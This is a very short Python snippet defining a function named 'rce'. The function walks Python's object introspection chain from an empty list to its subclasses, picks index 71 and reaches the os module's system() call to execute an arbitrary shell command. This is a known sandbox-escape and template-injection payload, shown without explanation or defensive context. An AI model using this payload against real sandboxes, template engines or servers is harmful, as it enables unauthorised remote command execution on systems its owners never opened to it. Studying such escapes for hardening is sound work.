# -*- coding：utf-8 -*-

def rce(cmd):
    [].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].system(cmd)